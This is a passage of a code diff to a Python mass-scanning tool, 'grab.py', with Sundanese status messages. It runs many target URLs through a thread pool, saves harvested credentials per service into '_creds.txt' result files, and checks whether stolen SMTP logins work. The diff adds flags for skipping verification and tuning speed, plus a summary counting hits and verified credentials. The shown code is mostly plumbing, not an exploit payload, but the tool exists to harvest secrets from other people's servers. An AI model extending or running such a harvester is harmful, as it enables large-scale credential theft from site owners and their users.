-                    text += ' | \033[31;1mSMTP\033[0m'
-
-                for service, data in all_findings.items():
-                    if service == 'SMTP':
-                        continue
-                    remover = droeam().format_output(url, {service: data})
-                    append_file('Results/%s/%s_creds.txt' % (service, service), remover)
-            else:
-                text += ' | \033[31;1mTeu bisa sadayana\033[0m'
-                append_file('Results/Not_VULNerable.txt', str(url).replace('\r', '') + '\n')
-        else:
-            text += ' | \033[0;33mTeu bisa sadayana\033[0m'
-            append_file('Results/Not_VULNerable.txt', str(url).replace('\r', '') + '\n')
-
-        printf(text)
-
-    except Exception:
-        text = '\033[31;1m#\033[0m ' + url
-        text += ' | \033[31;1mTeu bisa diakses\033[0m'
-        append_file('Results/Not_VULNerable.txt', str(url).replace('\r', '') + '\n')
-        printf(text)
-
-
 def save_session(lists, numthread, last):
     with open(pid_restore, 'w') as fh:
         fh.write("[DB]\nFILES=" + str(lists) + "\nTHREAD=" + str(numthread) +
@@ -3020,8 +3818,37 @@ def save_session(lists, numthread, last):
     print("CTRL+C Detect, Session saved")
 
 
+def apply_flags(argv):
+    global VERIFY, SMTP_SELFTEST, ENHANCED_SCAN, PRINT_VALID, TIMEOUT, MAX_ENDPOINTS
+    rest = []
+    for a in argv:
+        low = a.lower()
+        if low in ('--no-verify', '-nv'):
+            VERIFY = False
+        elif low in ('--no-selftest', '-ns'):
+            SMTP_SELFTEST = False
+        elif low in ('--fast', '-f'):
+            ENHANCED_SCAN = False
+            MAX_ENDPOINTS = 25
+        elif low in ('--quiet', '-q'):
+            PRINT_VALID = False
+        elif low.startswith('--timeout='):
+            TIMEOUT = float(low.split('=', 1)[1])
+        elif low.startswith('--endpoints='):
+            MAX_ENDPOINTS = int(low.split('=', 1)[1])
+        elif low in ('--help', '-h'):
+            print(__doc__)
+            print("usage: grab.py list.txt threads [--no-verify] [--no-selftest]"
+                  " [--fast] [--quiet] [--timeout=N] [--endpoints=N]")
+            sys.exit(0)
+        else:
+            rest.append(a)
+    return rest
+
+
 if __name__ == '__main__':
     print(BANNER)
+    argv = apply_flags(sys.argv[1:])
 
     lists = None
     numthread = None
@@ -3044,8 +3871,8 @@ if __name__ == '__main__':
             raise ValueError("reload config")
     except Exception:
         try:
-            lists = sys.argv[1]
-            numthread = sys.argv[2]
+            lists = argv[0]
+            numthread = argv[1]
             readsplit = open(lists).read().splitlines()
         except Exception:
             try:
@@ -3053,14 +3880,20 @@ if __name__ == '__main__':
                 readsplit = open(lists).read().splitlines()
             except Exception:
                 print("Euweuh Jandana euy!")
-                exit()
+                sys.exit()
             try:
-                numthread = input("Sabaraha Ronde ? ")
+                numthread = input("Sabarona Ronde ? ")
             except Exception:
                 print("Ronde Na Sabaraha!")
-                exit()
+                sys.exit()
+
+    COUNTER['total'] = len([u for u in readsplit if u.strip()])
+    print("Targets: %d | threads: %s | verify: %s | deep: %s"
+          % (COUNTER['total'], numthread, VERIFY, ENHANCED_SCAN))
 
     pool = ThreadPool(int(numthread))
+    last_url = None
+    started = time.time()
 
     try:
         for raw in readsplit:
@@ -3071,11 +3904,22 @@ if __name__ == '__main__':
                 url = "http://" + url
             if url.endswith('/'):
                 url = url[:-1]
+            last_url = url
             pool.add_task(main, url)
         pool.wait_completion()
     except KeyboardInterrupt:
-        save_session(lists, numthread, url)
-        exit()
+        save_session(lists, numthread, last_url)
+        sys.exit()
+
+    elapsed = time.time() - started
+    summary = (
+        "================ S U M M A R Y ================\n"
+        "targets : %d\nhits    : %d\nverified: %d\nelapsed : %.1fs\n"
+        "===============================================\n"
+        % (COUNTER['done'], COUNTER['hits'], COUNTER['valid'], elapsed)
+    )
+    print('\n' + summary)
+    save(os.path.join(RESULTS, 'SUMMARY.txt'), summary)
 
     try:
         os.remove(pid_restore)
